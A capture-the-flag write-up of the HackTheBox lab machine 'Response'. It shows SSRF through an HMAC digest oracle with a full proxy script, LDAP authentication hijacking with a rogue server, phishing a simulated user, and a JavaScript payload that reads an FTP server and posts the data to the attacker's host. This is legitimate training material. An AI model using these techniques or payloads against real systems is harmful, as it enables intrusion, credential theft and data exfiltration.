---
title: HTB: Response
url: https://0xdf.gitlab.io/2023/02/04/htb-response.html
date: 2023-02-04T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, ctf, htb-response, nmap, linux, ffuf, subdomain, feroxbuster, burp, burp-repeater, burp-proxy, hmac, oracle, foxyproxy, python, youtube, proxy, ssrf, socket-io, ldap, docker, ldif, ldapadd, ldappasswd, chatgpt, wireshark, forensics, cross-protocol-request-forgery, cprf, xp-ssrf, javascript, htb-luke, ftp, directory-traversal, python-https, certificate, openssl, dns, smtp, python-smptd, virus-total, meterpreter, crypto, mettle, bulk-extractor, openssh, partial-ssh-key, rsa, rsactftool, htb-proper, htb-crossfittwo
---

![Response](https://0xdfimages.gitlab.io/img/response-cover.png)

Response truly lived up to the insane rating, and was quite masterfully crafted. To start, I’ll construct a HTTP proxy that can abuse an SSRF vulnerability and a HMAC digest oracle to proxy traffic into the inner network and a chat application. With access as guest, I’ll find bob is eager to talk to the admin. I’ll redirect the LDAP auth to my host, where my LDAP server will grant access as admin, and I can talk to bob. bob speaks of an FTP server and gives creds, but I can’t access it. I’ll write a JavaScript payload that will above a cross protocol request forgery via a link sent to bob to read credentials off the FTP server. Next I’ll add my host as a computer to get scanned by a scanning program, and exploit a directory traversal in the state name of my TLS certificate to read the next user’s SSH key. Finally, I’ll find a PCAP and a core dump from a meterpreter process. I’ll write a decoder for the traffic, and, after pulling the AES key from the core dump memory, decrypt the traffic and pull a copy of a zip file that was exfiled from root’s home directory. Inside that zip is a screenshot which includes just the bottom of the user’s private key, as well as the authorized\_keys file with their public key. I’ll manually parse the two files to get all I need to reconstruct the full private key and get a shell as root.

## Box Info

| Name | [Response](https://hackthebox.com/machines/response)  [Response](https://hackthebox.com/machines/response) [Play on HackTheBox](https://hackthebox.com/machines/response) |
| --- | --- |
| Release Date | [14 May 2022](https://twitter.com/hackthebox_eu/status/1524434193677266944) |
| Retire Date | 04 Feb 2023 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Response |
| Radar Graph | Radar chart for Response |
| First Blood User | 03:22:52[m4cz m4cz](https://app.hackthebox.com/users/275298) |
| First Blood Root | 17:46:49[m4cz m4cz](https://app.hackthebox.com/users/275298) |
| Creator | [scryh scryh](https://app.hackthebox.com/users/46545) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.163
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-29 02:00 UTC
Nmap scan report for 10.10.11.163
Host is up (0.086s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.163
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-29 02:01 UTC
Nmap scan report for 10.10.11.163
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.21.6
|_http-server-header: nginx/1.21.6
|_http-title: Did not follow redirect to http://www.response.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, the host is likely running Ubuntu 20.04 focal. The site redirects to `www.response.htb`.

### Subdomain Fuzz

Given the use of domain names, I’ll fuzz for any subdomains that behave differently on the webserver using `ffuf`. I’ll run with not filter, and note that the default response size it 145. I’ll kill that and re-run with `-fs 145`:

```

oxdf@hacky$ ffuf -u http://10.10.11.163 -H "Host: FUZZ.response.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.163
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.response.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 145
________________________________________________

www                     [Status: 200, Size: 4617, Words: 1831, Lines: 110, Duration: 88ms]
api                     [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 88ms]
chat                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 88ms]
proxy                   [Status: 200, Size: 21, Words: 1, Lines: 2, Duration: 92ms]
:: Progress: [4989/4989] :: Job [1/1] :: 391 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

I’ll add these four and the base domain to my `/etc/hosts` file:

```
10.10.11.163 response.htb www.response.htb api.response.htb chat.response.htb proxy.response.htb

```

### www.response.htb - TCP 80

#### Site

The site is for a scanning provider:

[![image-20230130125254224](https://0xdfimages.gitlab.io/img/image-20230130125254224.png)](https://0xdfimages.gitlab.io/img/image-20230130125254224.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230130125254224.png)

There are no links on the page. I can collect some names / job roles (although it says these are customers) as well as some an email address:
- Marie Williams - Sysadmin
- Alex Miller - CTO
- James Taylor - Security Engineer
- contact@response.htb

Otherwise, not much here.

#### Tech Stack

The HTTP response headers don’t show much besides NGINX:

```

HTTP/1.1 200 OK
Server: nginx/1.21.6
Date: Mon, 30 Jan 2023 17:54:17 GMT
Content-Type: text/html
Content-Length: 4617
Last-Modified: Thu, 17 Mar 2022 14:37:06 GMT
Connection: close
ETag: "62334792-1209"
Accept-Ranges: bytes

```

The same page loads as `index.html`, suggesting this could just be a static site served by NGINX. There’s not even any JavaScript loaded by the page!

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` as that’s what the index page is:

```

oxdf@hacky$ feroxbuster -u http://www.response.htb -x html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://www.response.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      109l      297w     4617c http://www.response.htb/
301      GET        7l       11w      169c http://www.response.htb/css => http://www.response.htb/css/
301      GET        7l       11w      169c http://www.response.htb/img => http://www.response.htb/img/
301      GET        7l       11w      169c http://www.response.htb/assets => http://www.response.htb/assets/
200      GET      109l      297w     4617c http://www.response.htb/index.html
301      GET        7l       11w      169c http://www.response.htb/fonts => http://www.response.htb/fonts/
301      GET        7l       11w      169c http://www.response.htb/status => http://www.response.htb/status/
200      GET       59l       95w     1536c http://www.response.htb/status/index.html
[####################] - 3m    420000/420000  0s      found:8       errors:0      
[####################] - 3m     60000/60000   294/s   http://www.response.htb 
[####################] - 3m     60000/60000   293/s   http://www.response.htb/ 
[####################] - 3m     60000/60000   294/s   http://www.response.htb/css 
[####################] - 3m     60000/60000   295/s   http://www.response.htb/img 
[####################] - 3m     60000/60000   292/s   http://www.response.htb/assets 
[####################] - 3m     60000/60000   293/s   http://www.response.htb/fonts 
[####################] - 3m     60000/60000   293/s   http://www.response.htb/status 

```

This is all stuff I’ve already seen, except for `/status`.

#### /status

This page shows the status of a few services:

![image-20230130130952378](https://0xdfimages.gitlab.io/img/image-20230130130952378.png)

On visiting the page, it loads JavaScript from `/status/main.js.php`. This extension may look weird at first, but presumably this is a PHP script that generates the appropriate JavaScript. By generating the JavaScript on the fly, it can give it dynamic cookies, servers, etc.

In this case the JavaScript has `get_api_status`, `get_chat_status`, and `get_servers`, each of which look similar. For example:

```

function get_api_status(handle_data, handle_error) {
    url_proxy = 'http://proxy.response.htb/fetch';
    json_body = {'url':'http://api.response.htb/', 'url_digest':'cab532f75001ed2cc94ada92183d2160319a328e67001a9215956a5dbf10c545', 'method':'GET', 'session':'2f54d5421b84fbcf96ca7f4b7e8b28d7', 'session_digest':'628ddf8d85a8adc6f84b08362dfff13de0cb0ee4698b642333e0f94db0de64f6'};
    fetch(url_proxy, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(json_body)
    }).then(data => {
            return data.json();
    })
    .then(json => {
      if (json.status_code === 200) handle_data(JSON.parse(atob(json.body)));
      else handle_error('status_code ' + json.status_code);
    });
}

```

It’s going to make a request through to `proxy.response.htb` with a URL of `api.response.htb` as well as a session cookie and some digests (presumably keyed hashes that prevent my tampering with the parameters). The request for `get_chat_status` has a `url` of `http://api.response.htb/get_chat_status`, and the request for `get_servers` has a `url` of `http://api.response.htb/get_servers`.

The response from `proxy.response.htb/fetch` seems to include a `status_code` and the `body` base64-encoded. For example, from `get_chat_status`:

```

{
    "body": "eyJzdGF0dXMiOiJydW5uaW5nIiwidmhvc3QiOiJjaGF0LnJlc3BvbnNlLmh0YiJ9Cg==",
    "status_code": 200
}

```

That base64-decodes to:

```

{"status":"running","vhost":"chat.response.htb"}

```

This is likely the actual response from `api.response.htb/get_chat_status`.

Then each has a section that invoke the `get_*_status` function, like this:

```

get_api_status(data => {
  const span_api_status = document.getElementById('span_api_status');
  if (data.status === 'running') span_api_status.classList.add('success');
  else span_api_status.classList.add('fail');
  span_api_status.innerText = data.status;
}, err => {
  const span_api_status = document.getElementById('span_api_status');
  span_api_status.innerText = 'offline';
  span_api_status.classList.add('fail');
});

```

This is calling the function and updating the page based on the results. The section that handles the server is a bit different, clearing the table and rebuilding it based on the result, but the idea is still the same.

I’ll look at `/fetch` a bit more in the [proxy](#proxyresponsehtb---tcp-80) section.

I’ll also note that the session cookie in my request for `main.js.php` seems to match the cookie that comes back in the JavaScript:

![image-20230130205312129](https://0xdfimages.gitlab.io/img/image-20230130205312129.png)

### api.response.htb - TCP 80

Trying to visit `api.response.htb` returns 403 forbidden. Brute forcing directories shows a wildcard 403, which means that comes back for even a long random URL that can’t exist on the server.

The headers still show NGINX, but not much else to go on here.

### chat.response.htb - TCP 80

`chat.response.htb` behaves exactly the same as `api.response.htb`, returning 403 for everything, and running NGINX.

### proxy.response.htb - TCP 80

#### Site

Visiting `proxy.response.htb` returns a simple JSON payload:

```

HTTP/1.1 200 OK
Server: nginx/1.21.6
Date: Mon, 30 Jan 2023 18:37:44 GMT
Content-Type: application/json
Content-Length: 21
Connection: close

{"status":"running"}

```

This is some kind of API (still running NGINX).

Unfortunately, running `feroxbuster` returns nothing. A bit closer inspection shows that it starts failing after a few request:

![image-20230130135302771](https://0xdfimages.gitlab.io/img/image-20230130135302771.png)

So brute forcing the API isn’t really an option.

#### /fetch

The JavaScript on `www.response.htb/status` makes multiple requests to `/fetch`.

The request with the `url` of `http://chat.response.htb` returns this body (whitespace added by me):

```

{
    "body": "eyJhcGlfdmVyc2lvbiI6IjEuMCIsImVuZHBvaW50cyI6W3siZGVzYyI6ImdldCBhcGkgc3RhdHVzIiwibWV0aG9kIjoiR0VUIiwicm91dGUiOiIvIn0seyJkZXNjIjoiZ2V0IGludGVybmFsIGNoYXQgc3RhdHVzIiwibWV0aG9kIjoiR0VUIiwicm91dGUiOiIvZ2V0X2NoYXRfc3RhdHVzIn0seyJkZXNjIjoiZ2V0IG1vbml0b3JlZCBzZXJ2ZXJzIGxpc3QiLCJtZXRob2QiOiJHRVQiLCJyb3V0ZSI6Ii9nZXRfc2VydmVycyJ9XSwic3RhdHVzIjoicnVubmluZyJ9Cg==",
    "status_code": 200
}

```

I’m able to replay these requests in Burp Repeater, but if I tamper with any of the parameters, it fails:

```

HTTP/1.1 400 BAD REQUEST
Server: nginx/1.21.6
Date: Mon, 30 Jan 2023 18:33:57 GMT
Content-Type: application/json
Content-Length: 31
Connection: close
Access-Control-Allow-Origin: http://www.response.htb

{"error":"invalid url_digest"}

```

This looks like a SHA256 hash based on the length, but it doesn’t work when I try to regenerate it. It is likely a keyed hash (or HMAC), such that only someone with the secret key can generate the hashes. I’ve seen this kind of integrity protection before. In [Proper](/2021/08/21/htb-proper.html#access-to-licenses) I had to leak the salt/key to generate my own keys on the fly and perform SQL injection.

## Shell as bob

### Access to Chat as Guest

#### Partial Key Fail

I’m not able to find a way to leak the salt/key for the hash, but I will get close. If I cast the `PHPSESSID` as an array, PHP will crash, leaking *part* of the key:

![image-20230202131350228](https://0xdfimages.gitlab.io/img/image-20230202131350228.png)

Unfortunately, this is not enough.

#### Digest Oracle

Even without knowing the key, there is a way to get the site to generate the digest for me. I noted above that the `session` parameter takes the cookie I submit to it and returns the digest for it. What if I try sending a URL as a cookie?

There’s an error at the top of the response:

![image-20230130211115888](https://0xdfimages.gitlab.io/img/image-20230130211115888.png)

Still, further down the page, there’s a `session` and `session_digest`:

![image-20230130211155461](https://0xdfimages.gitlab.io/img/image-20230130211155461.png)

To test this, I’ll set up a `curl` request to `/fetch`, and pass it the `url` of `http://10.10.14.6/leak` and the digest from above. I’ll use my legit `session` and `session_digest`. It makes a request to me (as can be seen in the lower tmux terminal there):

![image-20230130211521938](https://0xdfimages.gitlab.io/img/image-20230130211521938.png)

That proves I have found a way to generate digests for arbitrary URLs, which means I can make requests through `proxy.response.htb`.

#### Fetch chat.response.htb

I can use this to try to read `chat.response.htb`. I’ll send a request to `/status/main.js.php` with my cookie set to `http://chat.response.htb/` to get a digest:

![image-20230131135328668](https://0xdfimages.gitlab.io/img/image-20230131135328668.png)

I’ll use that to send to `/fetch` and get the base64-encoded body:

![image-20230131135430373](https://0xdfimages.gitlab.io/img/image-20230131135430373.png)

That decodes to:

```

<!DOCTYPE html>
	<html lang="">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width,initial-scale=1">
		<link rel="icon" href="/favicon.ico">
		<title>Internal Chat</title>
		<link href="/css/app.3e20ea60.css" rel="preload" as="style">
		<link href="/js/app.52b61e62.js" rel="preload" as="script">
		<link href="/js/chunk-vendors.bc02b591.js" rel="preload" as="script">
		<link href="/css/app.3e20ea60.css" rel="stylesheet">
    </head>
    <body>
    	<noscript>
    		<strong>We're sorry but this application doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    	</noscript>
    	<div id="app"></div>
    	<div id="div_download" style="position:absolute;bottom:10px;right:10px;">
    		<a href="files/chat_source.zip" style="text-decoration:none;color:#cccccc;">download source code</a>
    	</div>
    	<script src="/js/chunk-vendors.bc02b591.js"></script>
    	<script src="/js/app.52b61e62.js"></script>
    </body>
</html>

```

The good news is that the source is available. The bad news is that this app runs completely in JavaScript, so to interact with it, I’m going to need to go beyond manual.

I’ll use the same steps as above to get `chat.response.htb/files/chat_source.zip`.

#### Flask HTTP Proxy Strategy

A HTTP proxy (like Burp) listens on a port, and when an HTTP request comes it, regardless of who it is to, rather than try to answer it, it analyzes the request, and forwards it on, and then gets the response and forwards it back to the original requester. It can also make changes to the request if need by.

I’m going to write a simple HTTP proxy that listens, but rather than forwarding the request, generates the appropriate request to `/fetch`, and then decodes the response and forwards it back. This will allow me to browse with Firefox as if I’m connecting directly.

Because I still want to see what’s happening, I’m going to route through Burp twice, like this:

![](https://0xdfimages.gitlab.io/img/ResponseProxy.png)

I’ll take `chat.response.htb` as an example. When I type that into Firefox:
1. FoxyProxy will see that matches a pattern and forward it to Burp.
2. Burp will see it matches a pattern and forward it to a Python / Flask server I’‘ll write shortly.
3. The Flask server will see the requested URL, get a digest for it from `main.js.php` (not through Burp, no need).
4. The proxy will make a request to `/fetch` for the desired URL, using the correct digest, sent to Burp.
5. Since Burp isn’t configured to do anything special will requests to `/fetch`, it will forward it on to `proxy.response.htb`.
6. `proxy.response.htb` will process the request, and, after validating the digests, fetch the desired page. In this example, that’s `chat.response.htb`.
7. The HTML for `chat.response.htb` is returned to `proxy.response.htb`
8. `proxy` base64-encodes the page and sets that as the `body` parameter, and updates the `status_code`, sending that response back through Burp to the proxy.
9. The proxy will decode the page body, and send that back to Firefox as the page it’s expecting.

By architecting it this way, I get to see both the requests from Firefox and the requests back from the proxy to `/fetch`. This provides a Zip archive.

#### Source Analysis

The source code files look like:

```

oxdf@hacky$ ls
babel.config.js  package.json  package-lock.json  public  README.md  server  src

```

`README.md` has information and instructions on deploying:

```

# Response Scanning Solutions - Internal Chat Application

This repository contains the Response Scanning Solutions internal chat application.

The application is based on the following article: https://socket.io/get-started/private-messaging-part-1/.

## How to deploy

Make sure `redis` server is running and configured in `server/index.js`.

Adjust `socket.io` URL in `src/socket.js`.

Install and build the frontend:

$ npm install
$ npm run build

Install and run the server:

$ cd server
$ npm install
$ npm start

```

It gives a reference as to what it’s developed based on, a [tutorial from socket.io](https://socket.io/get-started/private-messaging-part-1/).

Looking at `server/index.js`, I’ll note at the top it imports `ldap-authentication` as `authenticate`, and immediately after is a function named `authenticate_user`:

```

const { authenticate } = require("ldap-authentication");

async function authenticate_user(username, password, authserver) {

  if (username === 'guest' && password === 'guest') return true;

  if (!/^[a-zA-Z0-9]+$/.test(username)) return false;

  let options = {
    ldapOpts: { url: `ldap://${authserver}` },
    userDn: `uid=${username},ou=users,dc=response,dc=htb`,
    userPassword: password,
  }
  try {
    return await authenticate(options);
  } catch { }
  return false;
}

```

Right away I’ll note that the username guest with the password guest seems to allow access. Otherwise, it seems to use `ldap` to try to authenticate the username / password.

To see the server it’s using, I’ll look for where in this code `authenticate_user` is called:

```

  const username = socket.handshake.auth.username;
  if (!username) {
    return next(new Error("missing username"));
  }
  const password = socket.handshake.auth.password;
  if (!password) {
    return next(new Error("missing password"));
  }
  const authserver = socket.handshake.auth.authserver;
  if (!authserver) {
    return next(new Error("missing authserver"));
  }
  if (!await authenticate_user(username, password, authserver)) {
    return next(new Error("authentication error"));
  }

```

It seems to be reading it the same way that it’s reading the username and password.

#### Flask Proxy Creation

I’ll show how I generate this proxy in [this Video](https://www.youtube.com/watch?v=01Zxb1RyOaM):

The final script is (also available [here](https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-response/response_http.py)):

```

import base64
import re
import requests
from flask import Flask, request, Response

app = Flask(__name__)
mimetypes = {"css": "text/css", "js": "application/javascript"}

def get_digest(url):
    cookies = {"PHPSESSID": url}
    resp = requests.get("http://www.response.htb/status/main.js.php", cookies=cookies)
    digest = re.findall("'session_digest':'([a-f0-9]+)'", resp.text)[0]
    return digest

@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def all(path):
    target = request.url
    body = {
        "url": target,
        "url_digest": get_digest(target),
        "method": request.method,
        "session": "2f54d5421b84fbcf96ca7f4b7e8b28d7",
        "session_digest": "628ddf8d85a8adc6f84b08362dfff13de0cb0ee4698b642333e0f94db0de64f6",
    }
    if request.method == "POST":
        body["body"] = base64.b64encode(request.data).decode()
    resp = requests.post(
        "http://proxy.response.htb/fetch",
        json=body,
        proxies={"http": "http://127.0.0.1:8080"},
    )

    resp_body = base64.b64decode(resp.json()["body"])

    ext = request.path.rsplit(".", 1)[-1]
    return Response(resp_body, mimetype=mimetypes.get(ext, "text/html"))

if __name__ == "__main__":
    app.run(port=8001)

```

I’ll run this, and with Burp forwarding any traffic to `chat.response.htb` to this proxy, I can log in as guest / guest and get a chat interface:

![image-20230131143359222](https://0xdfimages.gitlab.io/img/image-20230131143359222.png)

### Chat as Admin

#### Chat with Bob

Both and I seem like the only users online. If I send something to Bob, he is quite eager to talk to the admin:

![image-20230131144018346](https://0xdfimages.gitlab.io/img/image-20230131144018346.png)

#### Enumerate Login

When I log in, there’s a POST request to `/socket.io` with this body:

```

40{"username":"guest","password":"guest","authserver":"ldap.response.htb"}

```

This is consistent with what I noted above in the source analysis.

#### Hijack Ldap

I’ll stand up a simple LDAP server with docker as described in [this article](https://medium.com/rahasak/deploy-ldap-directory-service-with-openldap-docker-8d9f438f1216). My `docker-compose.yaml` file looks like:

```

version: '2'
services:
  ldap:
    image: osixia/openldap:1.5.0
    container_name: ldap
    environment:
        - LDAP_ORGANISATION=response
        - LDAP_DOMAIN=response.htb
        - "LDAP_BASE_DN=dc=response,dc=htb"
        - LDAP_ADMIN_PASSWORD=0xdf0xdf
    ports:
        - 389:389
        - 636:636

```

I’ll run `docker-compose up -d ldap` from in the same directory as that file to start the server in the background. If for some reason I need to kill this container and start over, I’ll use `docker-compose down` to stop, and then I can bring it back up cleanly.

Now I’ll set Burp to intercept, and log in. The second request is the POST that has the login and server as shown above. I’ll change the server to my IP, and forward that request (turning intercept off). The browser doesn’t log in, but in Wireshark, I see an auth request:

![image-20230131150649827](https://0xdfimages.gitlab.io/img/image-20230131150649827.png)

I put in guest, but it is querying for `uid=guest,ou=users,dc=response,dc=htb`. This means I need to create a `users` organizational unit, and then create an admin user in it. I’ll create two files on my host. `users.ldif`:

```

dn: ou=users,dc=response,dc=htb
objectClass: top
objectClass: organizationalUnit
ou: users

```

And `admin.ldif`:

```

dn: uid=admin,ou=users,dc=response,dc=htb
uid: admin
cn: admin
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/admin
uidNumber: 14583102
gidNumber: 14564100
mail: admin@response.htb
gecos: admin

```

I’ll copy both of them into the running container, and get a shell in the container:

```

oxdf@hacky$ docker cp users.ldif ldap:/
oxdf@hacky$ docker cp admin.ldif ldap:/
oxdf@hacky$ docker exec -it ldap bash
root@7a1f479dd7f4:/#

```

`ldapadd` is the tool for adding an object to the directory. I’ll first create the organizational unit:

```

root@7a1f479dd7f4:/# ldapadd -x -H ldap://localhost -D "cn=admin,dc=response,dc=htb" -w 0xdf0xdf -f users.ldif 
adding new entry "ou=users,dc=response,dc=htb"

```

The `-D` is giving the admin information I set in the docker compose, and the `-w` is the admin password from there. [Here](https://explainshell.com/explain?cmd=ldapadd+-x+-H+ldap%3A%2F%2Flocalhost+-D+%22cn%3Dadmin%2Cdc%3Dresponse%2Cdc%3Dhtb%22+-w+0xdf0xdf+-f+users.ldif) is a full explain shell of that command.

Now I’ll add the user with the same command, just giving it the other file:

```

root@7a1f479dd7f4:/# ldapadd -x -H ldap://localhost -D "cn=admin,dc=response,dc=htb" -w 0xdf0xdf -f admin.ldif 
adding new entry "uid=admin,ou=users,dc=response,dc=htb"

```

Finally, I need to set the user’s password. In the above post, it just provides the SHA2 hash in the `.ldif` file, without any explanation of how it was generated. I’ll instead use `ldappasswd`:

```

root@7a1f479dd7f4:/# ldappasswd -D "cn=admin,dc=response,dc=htb" -w 0xdf0xdf -s "adminpass" -x "uid=admin,ou=users,dc=response,dc=htb"

```

[This command](https://explainshell.com/explain?cmd=ldappasswd+-D+%22cn%3Dadmin%2Cdc%3Dresponse%2Cdc%3Dhtb%22+-w+0xdf0xdf+-s+%22adminpass%22+-x+%22uid%3Dadmin%2Cou%3Dusers%2Cdc%3Dresponse%2Cdc%3Dhtb%22) sets the password to “adminpass”.

Now I’ll log in again, catch the POST and change the LDAP server to my host:

![image-20230131160814129](https://0xdfimages.gitlab.io/img/image-20230131160814129.png)

On forwarding that, it logs in as admin:

![image-20230131160839752](https://0xdfimages.gitlab.io/img/image-20230131160839752.png)

#### Alternative Hijack LDAP

Since it’s just needed for one auth request, I could also just use `nc` to fake an LDAP server and approve the auth request. I’ll ask ChatGPT:

![image-20230201141030676](https://0xdfimages.gitlab.io/img/image-20230201141030676.png)

The code in step 3 is a bit off - `nc` needs to listen (as it showed in step 2) rather than connect. Otherwise, it’s perfect. I’ll run that:

```

oxdf@hacky$ echo -ne '\x30\x0C\x02\x01\x01\x61\x07\x0A\x01\x00\x04\x00\x04\x00' | nc -lvnp 389
Listening on 0.0.0.0 389

```

Now when I try to log in, I’ll catch the post and change the LDAP server to my IP. It connect and approves:

```

oxdf@hacky$ echo -ne '\x30\x0C\x02\x01\x01\x61\x07\x0A\x01\x00\x04\x00\x04\x00' | nc -lvnp 389
Listening on 0.0.0.0 389
Connection received on 10.10.11.163 52582
06`1%uid=admin,ou=users,dc=response,dc=htbadmin0B

```

If I look at that in Wireshark, it’s a bit odd, as the `bindResponse(1) success` packet is seen before the `bindRequest(1)`:

![image-20230201141504189](https://0xdfimages.gitlab.io/img/image-20230201141504189.png)

That’s because `nc` is set to send that data as soon as the TCP handshake is complete. But it still works.

### Chat with Bob

Bob will message admin shortly after coming online. He’s moved the FTP server, and wants an IP tables article and a JavaScript article:

![image-20230131161210479](https://0xdfimages.gitlab.io/img/image-20230131161210479.png)

Big take-aways here:
- There’s an FTP server at 172.18.0.4:2121.
- Creds are ftp\_user / Secret12345.
- Bob wants a link from admin.

### Phishing Bob

Bob is waiting on a link, so I can try sending him one. First, I’ll make a simple HTML page that looks like it doesn’t work, but also tries to load JavaScript:

```

<html>
<head>
    <title>JavaScript Primer</title>
</head>
<body>
<p>This page isn't working right now</p>
<script src="http://10.10.14.6/js.js"></script>
</body>
</html>

```

While for HTB bob is automated, I’ll still practice good OPSEC. I’ll send bob the link:

![image-20230131164521935](https://0xdfimages.gitlab.io/img/image-20230131164521935.png)

Almost instantly there’s a hit on my webserver:

```
10.10.11.163 - - [31/Jan/2023 20:19:33] "GET /js.html HTTP/1.1" 200 -
10.10.11.163 - - [31/Jan/2023 20:19:34] code 404, message File not found
10.10.11.163 - - [31/Jan/2023 20:19:34] "GET /js.js HTTP/1.1" 404 -
10.10.11.163 - - [31/Jan/2023 20:19:34] code 404, message File not found
10.10.11.163 - - [31/Jan/2023 20:19:34] "GET /favicon.ico HTTP/1.1" 404 -

```

The GETs for `js.js` and `favicon.ico` suggest that bob’s automation is using a browser, not a script.

### Fails

#### Via Proxy

The first thing I’ll try is fetching this over `proxy.response.htb`. I’ll submit the URL to `main.js.php` to get a digest, and then submit that via `/fetch`. Unfortunately, requests don’t work on that port:

![image-20230131163913780](https://0xdfimages.gitlab.io/img/image-20230131163913780.png)

#### FTP Over XMLHTTP

My next thought is to create a JavaScript payload that will read from the FTP server. Borrowing a payload from [CrossFitTwo](/2021/08/14/htb-crossfittwo.html#cors-bypass), I’ll modify it to this:

```

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if ( xhr.readyState == 4) {
        var req_exfil = new XMLHttpRequest();
        req_exfil.open("POST", "http://10.10.14.6/exfil", false);
        req.exfil.send(xhr.response);
    }
}
xhr.open('GET', 'ftp://ftp_user:Secret12345@172.18.0.7:2121', false);
xhr.send();

```

The idea is that it will read from the FTP server, and then send the result back to me in a POST request. This doesn’t work.

I’ll open the site in my browser. I know I won’t be able to access the FTP IP, but seeing the error message when it fails may help figure out what’s going on. If I see a “Server doesn’t seem up” or “No response from server” message, that implies that the request was attempted. Instead, in the dev tools console there’s this message:

![image-20230131171947128](https://0xdfimages.gitlab.io/img/image-20230131171947128.png)

“CORS request not http”. It can’t make a cross origin request for the FTP protocol.

### Read FTP

#### Cross Protocol Request Forgery Background

Cross protocol request forgery (CPRF, or sometimes XP-CSRF or XP-XSRF) is basically sending HTTP requests that will hit non-HTTP servers and still perform the desired action. [This Netsparker article](https://www.netsparker.com.tr/blog/web-guvenligi/cross-protocol-request-forgery-cprf/) (in Turkish, but Google Translate does a good job) shows an example issuing a POST request that connects to an SMTP server and send an email. [This NCC Group paper](https://web.archive.org/web/20210602164919/https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/cprf-1.pdf) (for some reason only available on the wayback machine) has a lot more detail.

#### Example With Luke

A POST request sent from `XMLHttpRequest` will look something like:

```

POST / HTTP/1.1
Host: 10.10.14.6:223
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Content-Type: text/plain;charset=UTF-8
Content-Length: 4
Connection: close
Referer: http://10.10.14.6/

data

```

So what if that hits the FTP server? To demonstrate in a FTP scenario, I’ll boot up an old box that has anonymous FTP access, [Luke](/2019/09/14/htb-luke.html#ftp---tcp-21), and `nc` to the FTP server, sending that data:

```

oxdf@hacky$ echo "POST / HTTP/1.1
> Host: 10.10.14.6:223
> User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
> Content-Type: text/plain;charset=UTF-8
> Content-Length: 4
> Connection: close
> Referer: http://10.10.14.6/
> 
> data" | nc 10.10.10.137 21
220 vsFTPd 3.0.3+ (ext.1) ready...
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
530 Please login with USER and PASS.

```

It’s basically erroring on each line, and waiting for username and pass. So what if I include valid FTP commands in my POST body?

```

oxdf@hacky$ echo "POST / HTTP/1.1
> Host: 10.10.14.6:223                                           
> User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
> Content-Type: text/plain;charset=UTF-8
